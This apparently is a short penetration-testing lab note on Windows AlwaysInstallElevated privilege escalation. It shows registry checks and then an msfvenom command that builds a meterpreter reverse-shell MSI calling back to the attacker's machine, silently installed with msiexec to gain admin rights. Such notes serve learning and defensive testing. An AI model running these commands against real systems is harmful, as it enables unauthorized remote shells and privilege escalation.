# AlwaysInstallElevated

**`AlwaysInstallElevated`** → refer in windows like a backdoor which any program can installed with system or admin privilege if this setting is enable

![image.png](<../../../.gitbook/assets/image (36).png>)

to this vulnerability work must **`HKLM, HKCU`** enable **`AlwaysInstallElevated`**

```powershell
HKLM -> refer to all settings in register for whole **machine**
HKCU -> refer to all settings in register for **user**
```

***

### Detection

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer

# reg query -> use to read information from register
# \Software\Policies\Microsoft\Windows\Installer -> path in register which have all windows installer settings
```

we found this option is enabled

![2025-07-05 18\_16\_40-Kali Linux - VMware Workstation.png](<../../../.gitbook/assets/2025 07 05_18_16_40 Kali_Linux_ _VMware_Workstation.png>)

so let’s now this setting in user

```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

![2025-07-05 18\_18\_16-Kali Linux - VMware Workstation.png](<../../../.gitbook/assets/2025 07 05_18_18_16 Kali_Linux_ _VMware_Workstation.png>)

From the output, notice that “AlwaysInstallElevated” value is 1.

***

Exploit

create a reverse shell and move it to windows

```powershell
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
```

then open session using msfconsole

and then setup the payload using

```powershell
msiexec /quiet /qn /i C:\Temp\setup.msi
```

![2025-07-05 18\_21\_57-Kali Linux - VMware Workstation.png](<../../../.gitbook/assets/2025 07 05_18_21_57 Kali_Linux_ _VMware_Workstation.png>)

and we get a privilege admin

<figure><img src="../../../.gitbook/assets/image 1 (20).png" alt=""><figcaption></figcaption></figure>
